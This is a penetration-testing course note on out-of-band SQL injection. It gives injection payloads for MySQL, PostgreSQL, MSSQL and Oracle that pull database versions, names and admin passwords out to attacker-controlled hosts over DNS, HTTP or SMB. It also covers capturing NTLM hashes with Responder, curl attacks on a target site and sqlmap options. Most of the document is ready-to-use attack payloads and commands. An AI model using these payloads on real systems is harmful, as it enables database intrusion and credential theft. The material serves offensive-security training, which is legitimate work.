---
tags: [vapt, sqli, advanced]
difficulty: advanced
module: "06 - SQL Injection"
topic: "06.07 Out-of-Band SQLi (DNS exfiltration)"
---

# 06.07 — Out-of-Band SQLi (DNS Exfiltration)

## What is Out-of-Band SQLi?

Out-of-Band (OOB) SQLi exfiltrates data through a separate channel — typically DNS or HTTP requests — instead of through the application's HTTP response. This technique works when:
- No output in HTTP response (blind)
- No timing difference visible (time-based doesn't work)
- Network allows outbound DNS/HTTP from the database server
- Database has the necessary privileges/functions

```
NORMAL FLOW:
  Attacker → HTTP Request → App → DB → DB Response → App → HTTP Response → Attacker

OUT-OF-BAND FLOW:
  Attacker → HTTP Request → App → DB → DB makes DNS/HTTP request → Attacker's Server
                                                           ↑
                                            Data appears in DNS query!
                                            (bypasses the HTTP response completely)
```

---

## MySQL OOB via DNS

MySQL's `LOAD_FILE()` can make network requests on Windows (via UNC paths). On Linux, it requires `SELECT INTO OUTFILE` with network paths.

```sql
-- WINDOWS MYSQL + UNC PATH (old technique):
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.attacker.com\\x'))--
-- → DNS query: 8.0.28.attacker.com

-- MODERN APPROACH — OUTFILE to network share (Windows):
' UNION SELECT 'test' INTO OUTFILE '\\\\attacker.com\\share\\output.txt'--
-- → Creates file on attacker's SMB share (use Responder to capture!)

-- CURRENT DATABASE VIA DNS:
' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c, database(), 0x2e61747461636b65722e636f6d5c5c61))--
-- 0x5c5c5c5c = \\\\ (double backslash)
-- 0x2e61747461636b65722e636f6d5c5c61 = .attacker.com\\a
```

---

## MySQL OOB via Burp Collaborator

Burp Suite Pro provides a collaborator domain that captures DNS + HTTP requests:

```sql
-- SET UP: Get collaborator payload from Burp Suite Pro:
-- Example: 7tb34glc3o7y58iqhxmvn6fg9z8x42.burpcollaborator.net

-- INJECT:
' AND LOAD_FILE(CONCAT('\\\\', (SELECT HEX(version())), '.7tb34glc3o7y58iqhxmvn6fg9z8x42.burpcollaborator.net\\x'))--

-- CHECK BURP COLLABORATOR:
-- DNS query received: 382e302e3238.7tb34glc3o7y58iqhxmvn6fg9z8x42.burpcollaborator.net
-- Decode hex: 38=8, 2e=., 30=0, 2e=., 3238=28 → version = 8.0.28!
```

---

## PostgreSQL OOB via COPY TO

```sql
-- COPY command can read/write to OS (requires SUPERUSER):
'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--

-- WITH DATA:
'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl "http://attacker.com/?data="||data'--

-- NEWER APPROACH (pg 9.3+):
'; CREATE TABLE tmp (data TEXT); COPY tmp FROM PROGRAM 'curl http://attacker.com/?v=$(version)'; --

-- VIA DBLINK (if installed):
'; SELECT dblink_connect('host=attacker.com user=foo')--
-- → Triggers connection attempt to attacker.com:5432
```

---

## MSSQL OOB via DNS (Most Reliable!)

MSSQL has built-in functions that naturally trigger network requests:

```sql
-- DNS LOOKUP USING master..xp_dirtree:
'; EXEC master..xp_dirtree '\\attacker.com\x'--
-- → DNS query + SMB connection to attacker.com!

-- DATA EXFILTRATION VIA DNS:
'; DECLARE @v VARCHAR(1024);
SET @v = (SELECT TOP 1 password FROM users WHERE username='admin');
EXEC('master..xp_dirtree ''\\'+@v+'.attacker.com\x''')--

-- SIMPLER WITH CONCAT:
'; EXEC master..xp_dirtree CONCAT('\\', (SELECT TOP 1 password FROM users), '.attacker.com\x')--

-- OPENROWSET (requires xp_cmdshell off but OPENROWSET on):
'; SELECT * FROM OPENROWSET('SQLNCLI', 'server=attacker.com;uid=sa;pwd=x', 'SELECT 1')--
-- → Connection attempt reveals SA password attempt (capture with Responder!)

-- HTTP REQUEST VIA sp_OACreate (if OLE Automation enabled):
'; DECLARE @h INT;
EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1', @h OUT;
EXEC sp_OAMethod @h, 'Open', NULL, 'GET', 'http://attacker.com/', FALSE;
EXEC sp_OAMethod @h, 'Send';--
```

---

## Oracle OOB via UTL_HTTP / UTL_INADDR

```sql
-- HTTP REQUEST (requires UTL_HTTP access):
'; SELECT UTL_HTTP.request('http://attacker.com/?data='||user) FROM dual--

-- DNS LOOKUP (UTL_INADDR — faster, less restricted):
'; SELECT UTL_INADDR.get_host_name(user||'.attacker.com') FROM dual--
-- → DNS query: SCOTT.attacker.com

-- DBMS_LDAP (LDAP request → DNS):
'; SELECT DBMS_LDAP.init(user||'.attacker.com', 389) FROM dual--

-- EXTRACT DATA VIA DNS:
'; SELECT UTL_INADDR.get_host_name((SELECT password FROM users WHERE username='admin')||'.attacker.com') FROM dual--
```

---

## Setting Up DNS Capture

### Interactsh (Free Alternative to Burp Collaborator)

```bash
# INSTALL:
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# GET UNIQUE DOMAIN:
interactsh-client
# → Unique domain: c59e3crp82606187q1gk20azk8b36.oast.pro

# INJECT USING THIS DOMAIN:
# ...LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.c59e3crp82606187q1gk20azk8b36.oast.pro\\x'))--

# INTERACTSH SHOWS:
# [DNS] c59e3crp82606187q1gk20azk8b36.oast.pro → myapp.c59e3crp82606187q1gk20azk8b36.oast.pro
#                                                    ↑ database name = 'myapp'!
```

### Responder (Capture NTLM/DNS on Local Network)

```bash
# RESPONDER:
sudo responder -I eth0 -v
# Captures: SMB auth, DNS, HTTP, LDAP, MSSQL

# USEFUL WHEN DATABASE SERVER IS ON SAME NETWORK:
# MSSQL xp_dirtree → SMB auth attempt → Responder captures NTLM hash!
# → Crack NTLM hash with hashcat → get SA/service account password!
```

### Manual DNS Server (bind/nslookup capture)

```bash
# SIMPLE DNS LOGGER WITH PYTHON:
python3 -c "
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 53))
while True:
    data, addr = sock.recvfrom(1024)
    print(f'DNS Query from {addr}: {data}')
"
# Run on VPS with public IP
# Point DNS to your VPS: *.attacker.com → YOUR_VPS_IP
```

---

## Practical Example (MSSQL OOB)

```bash
# SETUP:
# 1. Start Interactsh: interactsh-client → get domain: abc123.oast.pro

# 2. TEST BASIC OOB:
curl "https://target.com/product?id=1; EXEC master..xp_dirtree '\\abc123.oast.pro\x'--"
# → Check Interactsh for DNS query!

# 3. EXTRACT DATABASE NAME:
curl "https://target.com/product?id=1; EXEC master..xp_dirtree CONCAT('\\', DB_NAME(), '.abc123.oast.pro\x')--"
# → DNS query: myapp.abc123.oast.pro → DB_NAME = 'myapp'!

# 4. EXTRACT TABLE (first char at a time via DNS):
# This is slow, so automate or use sqlmap --technique=U if possible!

# SQLMAP WITH OOB:
sqlmap -u "https://target.com/product?id=1" --technique=Q  # Q = stacked/OOB
sqlmap -u "https://target.com/product?id=1" --dns-domain=abc123.oast.pro --dbs
```

---

## When to Use OOB

```
USE CASE MATRIX:
  
  Error visible?       → Use ERROR-BASED (fastest!)
  Output visible?      → Use UNION-BASED (fast!)
  Boolean diff visible? → Use BOOLEAN-BLIND (medium)
  Timing observable?   → Use TIME-BASED (slow but no network req)
  Nothing visible?     → Use OUT-OF-BAND (needs outbound network)
  
OOB REQUIRES:
  ✓ Database can make outbound network connections
  ✓ Firewall allows: DNS (53), SMB (445), HTTP (80/443) outbound
  ✓ MySQL: FILE privilege
  ✓ MSSQL: xp_dirtree or sp_OACreate enabled
  ✓ Oracle: UTL_HTTP or UTL_INADDR privilege
  ✓ PostgreSQL: COPY TO PROGRAM (superuser)
  
MOST RELIABLE DATABASES FOR OOB:
  MSSQL → xp_dirtree always available if SQL Server Agent enabled
  Oracle → UTL_HTTP/UTL_INADDR common in enterprise
```

---

## Related Notes
- [[05 - Blind SQLi Boolean-Based]] — boolean blind technique
- [[06 - Blind SQLi Time-Based]] — time-based blind technique
- [[17 - MSSQL Specific Payloads]] — xp_dirtree and xp_cmdshell
- [[21 - sqlmap Full Usage Guide]] — sqlmap DNS exfil options
